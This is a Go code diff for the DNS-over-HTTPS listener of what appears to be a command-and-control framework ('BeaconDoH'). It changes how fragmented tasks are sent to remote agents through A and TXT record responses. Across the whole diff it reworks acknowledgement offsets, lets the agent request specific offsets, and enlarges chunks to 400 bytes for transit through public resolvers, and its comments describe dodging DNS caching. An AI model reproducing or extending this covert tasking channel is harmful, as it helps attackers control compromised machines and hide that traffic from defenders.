@@ -467,16 +467,24 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			var frame []byte
 
 			if reqQType == dns.TypeA {
+				// NEW DESIGN: Use ackOffset from heartbeat to detect completion.
+				// When agent finishes download, it resets downFilled to 0 and sends ackOffset=0.
+				// But before that, it will have sent ackOffset >= total indicating completion.
 				d.mu.Lock()
-				if oldDf, ok := d.downFrags[sid]; ok && oldDf.off >= oldDf.total {
-					delete(d.downFrags, sid)
-					if dohDebug {
-						fmt.Printf("[BeaconDoH-DNS] [ACK] Task confirmed by A-Record | sid=%s\n", sid)
+				if oldDf, ok := d.downFrags[sid]; ok {
+					// If agent's ackOffset >= total, they've received everything
+					if ackOffset >= oldDf.total {
+						delete(d.downFrags, sid)
+						df = nil // Clear local reference too
+						if dohDebug {
+							fmt.Printf("[BeaconDoH-DNS] [ACK] Task complete | sid=%s ackOffset=%d >= total=%d\n", sid, ackOffset, oldDf.total)
+						}
 					}
 				}
 				d.mu.Unlock()
 
-				hasTasks := (df != nil && df.off < df.total)
+				// hasTasks: check if there's pending data the agent hasn't ACK'd yet
+				hasTasks := (df != nil && df.total > 0 && ackOffset < df.total)
 				if hasTasks {
 					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.1").To4()}
 					m.Answer = append(m.Answer, rr)
@@ -486,31 +494,29 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				}
 			} else {
 				if df != nil {
-					if df.off >= df.total {
-						// Agent is requesting more data but we've sent everything.
-						// Check if ACK offset indicates they want a retransmission from a specific point.
-						if ackOffset > 0 && ackOffset < df.total {
-							if dohDebug {
-								fmt.Printf("[BeaconDoH-DNS] [RETRY] Agent requested retransmission | sid=%s | Resending from ACK offset %d\n", sid, ackOffset)
-							}
-							df.off = ackOffset
-						} else {
-							if dohDebug {
-								fmt.Printf("[BeaconDoH-DNS] [RETRY] Agent requested data again | sid=%s | Resending from offset 0\n", sid)
-							}
-							df.off = 0
-						}
+					// NEW DESIGN: Agent specifies requested offset in the TXT query's dataLabel.
+					// This makes each request unique (different QNAME = no DNS caching).
+					// dataB contains the 4-byte big-endian requested offset.
+					var requestedOffset uint32 = 0
+					if len(dataB) >= 4 {
+						requestedOffset = binary.BigEndian.Uint32(dataB[0:4])
+					}
+					if requestedOffset >= df.total {
+						requestedOffset = 0 // wrap around if invalid
+					}
+					if dohDebug {
+						fmt.Printf("[BeaconDoH-DNS] [DOWN] Agent requested offset %d | sid=%s\n", requestedOffset, sid)
 					}
 
-					if df.off < df.total {
+					if df.total > 0 {
 						maxChunk := d.Config.PktSize
 						isTCP := w.RemoteAddr().Network() == "tcp"
 
 						if !isTCP {
-							// DoH-friendly chunk size: 180 bytes binary = ~240 bytes Base64
-							// This is conservative but reliable through public DoH resolvers.
-							// Many DoH resolvers truncate large TXT responses via UDP.
-							const dohSafeChunk = 180
+							// DoH chunk size: 400 bytes binary = ~540 bytes Base64
+							// Most DoH resolvers can handle ~500-600 byte TXT responses over UDP.
+							// If truncation occurs, agent will detect offset mismatch and retry.
+							const dohSafeChunk = 400
 							if maxChunk <= 0 || maxChunk > dohSafeChunk {
 								maxChunk = dohSafeChunk
 							}
@@ -520,7 +526,7 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 							}
 						}
 
-						remaining := df.total - df.off
+						remaining := df.total - requestedOffset
 						chunkLen := remaining
 						if chunkLen > uint32(maxChunk) {
 							chunkLen = uint32(maxChunk)
@@ -528,15 +534,15 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 
 						frame = make([]byte, 8+chunkLen)
 						binary.BigEndian.PutUint32(frame[0:4], df.total)
-						binary.BigEndian.PutUint32(frame[4:8], df.off)
-						copy(frame[8:], df.buf[df.off:df.off+chunkLen])
+						binary.BigEndian.PutUint32(frame[4:8], requestedOffset)
+						copy(frame[8:], df.buf[requestedOffset:requestedOffset+chunkLen])
 
 						if dohDebug {
-							fmt.Printf("[BeaconDoH-DNS] [DOWN] Sending Fragment | sid=%s | %d bytes (Offset: %d / Total: %d) | TCP: %v\n",
-								sid, chunkLen, df.off, df.total, isTCP)
+							fmt.Printf("[BeaconDoH-DNS] [DOWN] Sending Fragment | sid=%s | %d bytes (ReqOff: %d / Total: %d) | TCP: %v\n",
+								sid, chunkLen, requestedOffset, df.total, isTCP)
 						}
 
-						df.off += chunkLen
+						// Don't update df.off - let agent control the flow
 					}
 				}
 
